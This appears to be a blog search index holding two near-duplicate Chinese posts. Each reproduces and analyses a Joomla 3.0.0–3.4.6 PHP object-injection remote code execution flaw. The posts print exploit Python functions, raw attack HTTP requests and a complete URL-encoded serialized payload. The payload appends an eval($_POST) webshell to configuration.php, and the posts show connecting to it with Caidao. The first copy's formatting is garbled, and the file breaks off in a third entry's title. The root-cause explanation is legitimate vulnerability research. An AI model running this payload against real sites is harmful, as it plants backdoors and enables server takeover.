<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title></title>
    <url>%2F2019%2F10%2F10%2Fbobao-360%2F</url>
    <content type="text"><![CDATA[Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-8562。建议使用就版本的用户更新到安全版本。 在此次漏洞复现和原理分析过程中，学到很多东西，在这里要感谢PHITHON关于Joomla远程代码执行漏洞的总结，让我少走了很多弯路。另外本文较长，请耐心阅读！ #影响范围Joomla 3.0.0 至 3.4.6 #漏洞复现1.安装部署 下载： https://downloads.joomla.org/it/cms/joomla3/3-4-6 浏览器访问 http://127.0.0.1/Joomla/3.4.6/installation/index.php 安装注意：第3步最终确认哪里，应该选择 “不安装示范数据”，目前测试的是选择”博客风格的示范内容”不能成功复现安装成功 2.Exp复现Exp地址:https://cxsecurity.com/issue/WLB-2019100045 脚本利用 执行成功反弹shell并在“configuration.php”写入随机密码的一句话木马 可以用NC 监听和 菜刀连接 由于我的PHP是Windows环境所以无法反弹只能通过菜刀连接 caidao密码为 scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay 菜刀连接成功 #Exp攻击链分析目前互联网上公开的Exp地址:https://cxsecurity.com/issue/WLB-2019100045通过漏洞复现和分析py脚本可以知道，在上传shell的时候有以下几步，之所以有这么手工步骤主要与Joomla的会话机制有关。 1.获取Cookie代码:通过burpeuite抓到的请求包1 123456GET /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: close 2.获取csrf-token （关键步骤）代码： 123456789def get_token(url, cook): token = &apos;&apos; resp = requests.get(url, cookies=cook, proxies = PROXS) html = BeautifulSoup(resp.text,&apos;html.parser&apos;) # csrf token is the last input for v in html.find_all(&apos;input&apos;): csrf = v csrf = csrf.get(&apos;name&apos;) return csrf 通过burpeuite抓到的请求包2： 1234567GET /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: dc674b0eef3d2412c63832504cf5ac18=sfoodgd4m6fj2c1895u5b2tmp6; 主要是从返回包中提取 csrftoken 3.生成payload 这里有2个payload后门的payload代码:利用PHP自带的file_put_contents函数写入webshell到configuration.php中，webshell内容如下： 1&apos;if(isset($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;])) eval($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;]);&apos; 反弹的payload 4.发送带有写入webshell的请求主要构造username,password,option,task,csrftoken等字段 123456789101112131415161718192021222324252627def make_req(url , object_payload): # just make a req with object print_info(&apos;Getting Session Cookie ..&apos;) cook = get_cook(url) print_info(&apos;Getting CSRF Token ..&apos;) csrf = get_token( url, cook) user_payload = &apos;\\0\\0\\0&apos; * 9 padding = &apos;AAA&apos; # It will land at this padding working_test_obj = &apos;s:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;&#125;&apos; clean_object = &apos;A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB&apos; # working good without bad effects inj_object = &apos;&quot;;&apos; inj_object += object_payload inj_object += &apos;s:6:&quot;return&quot;;s:102:&apos; # end the object with the &apos;return&apos; part password_payload = padding + inj_object params = &#123; &apos;username&apos;: user_payload, &apos;password&apos;: password_payload, &apos;option&apos;:&apos;com_users&apos;, &apos;task&apos;:&apos;user.login&apos;, csrf :&apos;1&apos; &#125; print_info(&apos;Sending request ..&apos;) resp = requests.post(url, proxies = PROXS, cookies = cook,data=params) return resp.text 下面是通过Burpsuite抓包获取的写入webshell的请求包3 1234567891011POST /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: dc674b0eef3d2412c63832504cf5ac18=bg7tprkie898gu5luh1it52ga3Content-Length: 1136Content-Type: application/x-www-form-urlencodedusername=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&amp;password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A217%3A%22file_put_contents%28%27configuration.php%27%2C%27if%28isset%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%29+eval%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%3B%27%2C+FILE_APPEND%29+%7C%7C+%24a%3D%27http%3A%2F%2Fwtf%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&amp;option=com_users&amp;task=user.login&amp;03b291424900343c59f58ad131d087a7=1 5.连接webshell测试是否写入成功通过burpeuite抓到的请求包4： 12345678910POST /Joomla/3.4.6//configuration.php HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeContent-Length: 70Content-Type: application/x-www-form-urlencodedscgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay=echo+%27PWNED%27%3B #漏洞分析这个漏洞是和Joomla的会话的运作机制有关，Joomla 会话以 PHP Objects 的形式存储在数据库中且由 PHP 会话函数处理，但是由于Mysql无法保存Null 字节，函数在将session写入数据库和读取时会对象因大小不正确而导致不合法从而溢出。因为未认证用户的会话也可存储，所以该对象注入 (Object Injection) 可以在未登录认证的情况下攻击成功，导致RCE。 1.溢出当我们在 Joomla中执行 POST 请求时，通常会有303重定向将我们重定向至结果页。这是利用的重要事项，因为第一个请求（含参数）将只会导致 Joomla 执行动作并存储（例如调用write() 函数）会话，之后303重定向将进行检索（如调用read() 函数）并将信息显示给用户。 漏洞利用文件‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘\0\0\0’替换‘\x00\x2a\x00’(chr(0).’’.chr(0))，而在序列化对象中， $protected 变量被赋予‘\x00\x2a\x00’前缀。当读取数据库中的数据时， read 函数会用‘\x00\x2a\x00’（NN）替换‘\0\0\0’，重构原始对象。这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘\0\0\0’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。举个栗子比如一个登录表单，在 username 字段中放入‘my\x00\x2a\x00username’，经过write函数处理后将在数据库中得到如下对象： 12345678当该会话对象被 read 函数中读取时，‘\0\0\0’将被以如上所述方式所替代，得到如下值：```s:8:s:&quot;username&quot;;s:16:&quot;myN*Nusername&quot; --&gt;不合法的大小``` 被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。**2. 对象注入（反序列化）** (本部分参考PHITHON的博客)CVE-2015-8562的Poc如下 User-Agent: 123}__test|O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:37:”phpinfo();JFactory::getConfig();exit;”;}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;i:1;}4 123456在这个执行链中，分别利用了如下类：JDatabaseDriverMysqliSimplePie**2.1 JDatabaseDriverMysqli类** 我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作： &lt;?phppublic function __destruct() { $this-&gt;disconnect(); } … public function disconnect() { // Close the connection. if ($this-&gt;connection) { foreach ($this-&gt;disconnectHandlers as $h) { call_user_func_array($h, array( &amp;$this)); } mysqli_close($this-&gt;connection); } $this-&gt;connection = null; } 1234567当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用__destruct，__destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), &apos;init&apos;]，传入call_user_func_array。跟进init方法： &lt;?phpfunction init() { // Check absolute bare minimum requirements. if ((function_exists(‘version_compare’) &amp;&amp; version_compare(PHP_VERSION, ‘4.3.0’, ‘&lt;’)) || !extension_loaded(‘xml’) || !extension_loaded(‘pcre’)) { return false; } … if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null) { $this-&gt;data = array(); $this-&gt;multifeed_objects = array(); $cache = false; if ($this-&gt;feed_url !== null) { $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url); // Decide whether to enable caching if ($this-&gt;cache &amp;&amp; $parsed_feed_url[&apos;scheme&apos;] !== &apos;&apos;) { $cache = call_user_func(array($this-&gt;cache_class, &apos;create&apos;), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), &apos;spc&apos;);123456789很明显，其中这两个call_user_func将是触发代码执行的元凶。所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。**2.2 SimplePie类** 默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：![](https://p4.ssl.qhimg.com/t01f77bceb29dffd587.png)而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。P牛的Poc O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:37:”phpinfo();JFactory::getConfig();exit;”;}i:1;s:4:”init”;}}s:13:”\0\0\0connection”;i:1;}ð 12前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了选择用file_put_contents函数写入一句话到configuration.php中 file_put_contents(‘configuration.php’,’if(isset($_POST[\&#39;test\&#39;])) eval($_POST[\&#39;test\&#39;]);&#39;, FILE_APPEND) || $a=&#39;http://wtf\&#39;; 1最终的对象如下： AAA”;s:11:”maonnalezzo”:O:21:”JDatabaseDriverMysqli”:3:{s:4:”\0\0\0a”;O:17:”JSimplepieFactory”:0:{}s:21:”\0\0\0disconnectHandlers”;a:1:{i:0;a:2:{i:0;O:9:”SimplePie”:5:{s:8:”sanitize”;O:20:”JDatabaseDriverMysql”:0:{}s:5:”cache”;b:1;s:19:”cache_name_function”;s:6:”assert”;s:10:”javascript”;i:9999;s:8:”feed_url”;s:217:”file_put_contents(‘configuration.php’,’if(isset($_POST[&#39;ja0k&#39;]))+eval($_POST[&#39;ja0k&#39;]);’,+FILE_APPEND)+||+$a=’http://wtf&#39;;&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\0\0\0connection&quot;;i:1;}s:6:&quot;return&quot;;s:102: ### \#修复建议 更新至最新版本 官方地址https://downloads.joomla.org **代码及工具下载：** https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE **免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。** 参考： [1].https://cxsecurity.com/issue/WLB-2019100045 [2].https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html [3].https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA]]></content>
  </entry>
  <entry>
    <title><![CDATA[漏洞分析-Joomla-3.4.6远程代码执行漏洞原理分析和Poc构造]]></title>
    <url>%2F2019%2F10%2F09%2F%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-Joomla-3-4-6%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%92%8CPoc%E6%9E%84%E9%80%A0%2F</url>
    <content type="text"><![CDATA[Author：Ja0k #事件背景上周，意大利安全公司 Hacktive Security的研究员 AlessandroGroppo 公开了影响 Joomla 内容管理系统老旧版本 3.0.0 至 3.4.6 （在2012年9月末至2015年12月中旬发布）的0day 详情。该漏洞是一个 PHP 对象注入漏洞，可导致远程代码执行后果。它尚不存在 CVE 编号且易于利用，类似于 CVE-2015-8562。建议使用就版本的用户更新到安全版本。 在此次漏洞复现和原理分析过程中，学到很多东西，在这里要感谢PHITHON关于Joomla远程代码执行漏洞的总结，让我少走了很多弯路。另外本文较长，请耐心阅读！ #影响范围Joomla 3.0.0 至 3.4.6 #漏洞复现1.安装部署 下载： https://downloads.joomla.org/it/cms/joomla3/3-4-6 浏览器访问 http://127.0.0.1/Joomla/3.4.6/installation/index.php 安装注意：第3步最终确认哪里，应该选择 “不安装示范数据”，目前测试的是选择”博客风格的示范内容”不能成功复现安装成功 2.Poc复现Poc地址:https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py 脚本利用 执行成功反弹shell并在“configuration.php”写入随机密码的一句话木马 可以用NC 监听和 菜刀连接 由于我的PHP是Windows环境所以无法反弹只能通过菜刀连接 caidao密码为 scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay 菜刀连接成功 #Exp攻击链分析目前互联网上公开的Exp下载地址:https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE/Joomla-3.4.6-RCE.py通过漏洞复现和分析py脚本可以知道，在上传shell的时候有以下几步，之所以有这么手工步骤主要与Joomla的会话机制有关。 1.获取Cookie代码:通过burpeuite抓到的请求包1 123456GET /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: close 2.获取csrf-token （关键步骤）代码： 123456789def get_token(url, cook): token = &apos;&apos; resp = requests.get(url, cookies=cook, proxies = PROXS) html = BeautifulSoup(resp.text,&apos;html.parser&apos;) # csrf token is the last input for v in html.find_all(&apos;input&apos;): csrf = v csrf = csrf.get(&apos;name&apos;) return csrf 通过burpeuite抓到的请求包2： 1234567GET /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: dc674b0eef3d2412c63832504cf5ac18=sfoodgd4m6fj2c1895u5b2tmp6; 主要是从返回包中提取 csrftoken 3.生成payload 这里有2个payload后门的payload代码:利用PHP自带的file_put_contents函数写入webshell到configuration.php中，webshell内容如下： 1&apos;if(isset($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;])) eval($_POST[\&apos;scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay\&apos;]);&apos; 反弹的payload 4.发送带有写入webshell的请求主要构造username,password,option,task,csrftoken等字段 123456789101112131415161718192021222324252627def make_req(url , object_payload): # just make a req with object print_info(&apos;Getting Session Cookie ..&apos;) cook = get_cook(url) print_info(&apos;Getting CSRF Token ..&apos;) csrf = get_token( url, cook) user_payload = &apos;\\0\\0\\0&apos; * 9 padding = &apos;AAA&apos; # It will land at this padding working_test_obj = &apos;s:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:&#123;s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;&#125;&apos; clean_object = &apos;A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB&apos; # working good without bad effects inj_object = &apos;&quot;;&apos; inj_object += object_payload inj_object += &apos;s:6:&quot;return&quot;;s:102:&apos; # end the object with the &apos;return&apos; part password_payload = padding + inj_object params = &#123; &apos;username&apos;: user_payload, &apos;password&apos;: password_payload, &apos;option&apos;:&apos;com_users&apos;, &apos;task&apos;:&apos;user.login&apos;, csrf :&apos;1&apos; &#125; print_info(&apos;Sending request ..&apos;) resp = requests.post(url, proxies = PROXS, cookies = cook,data=params) return resp.text 下面是通过Burpsuite抓包获取的写入webshell的请求包3 1234567891011POST /Joomla/3.4.6/index.php/component/users HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeCookie: dc674b0eef3d2412c63832504cf5ac18=bg7tprkie898gu5luh1it52ga3Content-Length: 1136Content-Type: application/x-www-form-urlencodedusername=%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0%5C0&amp;password=AAA%22%3Bs%3A11%3A%22maonnalezzo%22%3AO%3A21%3A%22JDatabaseDriverMysqli%22%3A3%3A%7Bs%3A4%3A%22%5C0%5C0%5C0a%22%3BO%3A17%3A%22JSimplepieFactory%22%3A0%3A%7B%7Ds%3A21%3A%22%5C0%5C0%5C0disconnectHandlers%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bi%3A0%3BO%3A9%3A%22SimplePie%22%3A5%3A%7Bs%3A8%3A%22sanitize%22%3BO%3A20%3A%22JDatabaseDriverMysql%22%3A0%3A%7B%7Ds%3A5%3A%22cache%22%3Bb%3A1%3Bs%3A19%3A%22cache_name_function%22%3Bs%3A6%3A%22assert%22%3Bs%3A10%3A%22javascript%22%3Bi%3A9999%3Bs%3A8%3A%22feed_url%22%3Bs%3A217%3A%22file_put_contents%28%27configuration.php%27%2C%27if%28isset%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%29+eval%28%24_POST%5B%5C%27scgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay%5C%27%5D%29%3B%27%2C+FILE_APPEND%29+%7C%7C+%24a%3D%27http%3A%2F%2Fwtf%27%3B%22%3B%7Di%3A1%3Bs%3A4%3A%22init%22%3B%7D%7Ds%3A13%3A%22%5C0%5C0%5C0connection%22%3Bi%3A1%3B%7Ds%3A6%3A%22return%22%3Bs%3A102%3A&amp;option=com_users&amp;task=user.login&amp;03b291424900343c59f58ad131d087a7=1 5.连接webshell测试是否写入成功通过burpeuite抓到的请求包4： 12345678910POST /Joomla/3.4.6//configuration.php HTTP/1.1Host: 127.0.0.1User-Agent: python-requests/2.22.0Accept-Encoding: gzip, deflateAccept: */*Connection: closeContent-Length: 70Content-Type: application/x-www-form-urlencodedscgcapjoqwokhrtmlutbljpzmqzwcbncowtiztctfekiwtfzay=echo+%27PWNED%27%3B #漏洞分析这个漏洞是和Joomla的会话的运作机制有关，Joomla 会话以 PHP Objects 的形式存储在数据库中且由 PHP 会话函数处理，但是由于Mysql无法保存Null 字节，函数在将session写入数据库和读取时会对象因大小不正确而导致不合法从而溢出。因为未认证用户的会话也可存储，所以该对象注入 (Object Injection) 可以在未登录认证的情况下攻击成功，导致RCE。 1.溢出当我们在 Joomla中执行 POST 请求时，通常会有303重定向将我们重定向至结果页。这是利用的重要事项，因为第一个请求（含参数）将只会导致 Joomla 执行动作并存储（例如调用write() 函数）会话，之后303重定向将进行检索（如调用read() 函数）并将信息显示给用户。 漏洞利用文件‘libraries/joomla/session/storage/database.php’中定义的函数 read()和 write()由session_set_save_handler()设置，作为‘libraries/joomla/session/session.php:__start’ session_start() 调用的读和写处理程序。由于Mysql无法保存Null 字节，libraries/joomla/session/storage/database.php的write函数在将数据存储到数据库之前（write函数）会用‘\0\0\0’替换‘\x00\x2a\x00’(chr(0).’’.chr(0))，而在序列化对象中， $protected 变量被赋予‘\x00\x2a\x00’前缀。当读取数据库中的数据时， read 函数会用‘\x00\x2a\x00’（NN）替换‘\0\0\0’，重构原始对象。这种替换的主要问题在于它用3个字节替换了6个字节。这种代码在Joomla3.0.0到3.4.6 版本中一直存在。从 3.4.7 版本开始，会话是 base64 编码形式存储在数据库中。如之前所述，我们能够通过动作参数的读取和写入来操纵该会话对象进行注入将被3个字节替换的‘\0\0\0’，导致对象因大小不正确（字节长度不同）导致不合法，造成溢出。举个栗子比如一个登录表单，在 username 字段中放入‘my\x00\x2a\x00username’，经过write函数处理后将在数据库中得到如下对象: 1s:8:s:&quot;username&quot;;s:16:&quot;my\0\0\0username&quot; 当该会话对象被 read 函数中读取时，‘\0\0\0’将被以如上所述方式所替代，得到如下值： 1s:8:s:&quot;username&quot;;s:16:&quot;myN*Nusername&quot; --&gt;不合法的大小 被替换的字符串只有13个字节长，但生命的字符串长度仍然是16个字节！就可以愉快地利用这种“溢出”构造一个可以实现 RCE 的一个新的对象，在可以控制反序列化对象以后，我们只需构造一个能够一步步调用的执行链，即可进行一些危险的操作了。在本次曝光的Poc中就是用username字段进行溢出，password字段进行对象注入，如果插入任意serialize字符串，构造反序列化漏洞了，到这里就和之前的漏洞CVE-2015-8562的比较相似了。 2. 对象注入（反序列化） (本部分参考PHITHON的博客)CVE-2015-8562的Poc如下 1User-Agent: 123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;4 在这个执行链中，分别利用了如下类：JDatabaseDriverMysqliSimplePie 2.1 JDatabaseDriverMysqli类我们可以在JDatabaseDriverMysqli类的析构函数里找到一处敏感操作： 123456789101112131415161718192021&lt;?phppublic function __destruct() &#123; $this-&gt;disconnect(); &#125; ... public function disconnect() &#123; // Close the connection. if ($this-&gt;connection) &#123; foreach ($this-&gt;disconnectHandlers as $h) &#123; call_user_func_array($h, array( &amp;$this)); &#125; mysqli_close($this-&gt;connection); &#125; $this-&gt;connection = null; &#125; 当exp对象反序列化后，将会成为一个JDatabaseDriverMysqli类对象，不管中间如何执行，最后都将会调用destruct，destruct将会调用disconnect，disconnect里有一处敏感函数：call_user_func_array。 但很明显，这里的call_user_func_array的第二个参数，是我们无法控制的。所以不能直接构造assert+eval来执行任意代码。 于是这里再次调用了一个对象：SimplePie类对象，和它的init方法组成一个回调函数[new SimplePie(), ‘init’]，传入call_user_func_array。 跟进init方法： 12345678910111213141516171819202122&lt;?phpfunction init() &#123; // Check absolute bare minimum requirements. if ((function_exists(&apos;version_compare&apos;) &amp;&amp; version_compare(PHP_VERSION, &apos;4.3.0&apos;, &apos;&lt;&apos;)) || !extension_loaded(&apos;xml&apos;) || !extension_loaded(&apos;pcre&apos;)) &#123; return false; &#125; ... if ($this-&gt;feed_url !== null || $this-&gt;raw_data !== null) &#123; $this-&gt;data = array(); $this-&gt;multifeed_objects = array(); $cache = false; if ($this-&gt;feed_url !== null) &#123; $parsed_feed_url = SimplePie_Misc::parse_url($this-&gt;feed_url); // Decide whether to enable caching if ($this-&gt;cache &amp;&amp; $parsed_feed_url[&apos;scheme&apos;] !== &apos;&apos;) &#123; $cache = call_user_func(array($this-&gt;cache_class, &apos;create&apos;), $this-&gt;cache_location, call_user_func($this-&gt;cache_name_function, $this-&gt;feed_url), &apos;spc&apos;); 很明显，其中这两个call_user_func将是触发代码执行的元凶。 所以，可以将其中第二个call_user_func的第一个参数cache_name_function，赋值为assert，第二个参数赋值为我需要执行的代码，就构造好了一个『回调后门』。 2.2 SimplePie类默认情况下SimplePie是没有定义的，这也是为什么我在调用SimplePie之前先new了一个JSimplepieFactory的原因，因为JSimplepieFactory对象在加载时会调用import函数将SimplePie导入到当前工作环境：而JSimplepieFactory有autoload，所以不再需要其他include来对其进行加载。P牛的Poc 1O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;ð 前面讲过由于Joomla的会话机制Post请求会被303重定向到结果页面所以无法回显,这里的phpinfo函数就用不了选择用file_put_contents函数写入一句话到configuration.php中 1file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\\\&apos;test\\\&apos;])) eval($_POST[\\\&apos;test\\\&apos;]);\&apos;, FILE_APPEND) || $a=\&apos;http://wtf\&apos;; 最终的对象如下： 1AAA&quot;;s:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:217:&quot;file_put_contents(&apos;configuration.php&apos;,&apos;if(isset($_POST[\&apos;ja0k\&apos;]))+eval($_POST[\&apos;ja0k\&apos;]);&apos;,+FILE_APPEND)+||+$a=&apos;http://wtf&apos;;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connection&quot;;i:1;&#125;s:6:&quot;return&quot;;s:102: #修复建议更新至最新版本官方地址https://downloads.joomla.org 代码及工具下载：https://github.com/SecurityCN/Vulnerability-analysis/blob/master/Joomla/Joomla3.4.6-RCE 免责声明：本文中提到的漏洞利用Poc和脚本仅供研究学习使用，请遵守《网络安全法》等相关法律法规。 参考：[1].https://cxsecurity.com/issue/WLB-2019100045[2].https://www.leavesongs.com/PENETRATION/joomla-unserialize-code-execute-vulnerability.html[3].https://mp.weixin.qq.com/s/NG0fw-si2BchcKVz5atsdA]]></content>
      <categories>
        <category>技术</category>
        <category>安全研究</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>漏洞分析</tag>
        <tag>对象注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【专栏】Fastjson反序列化漏洞系列1-什么是fastjson反序列化？]]></title>
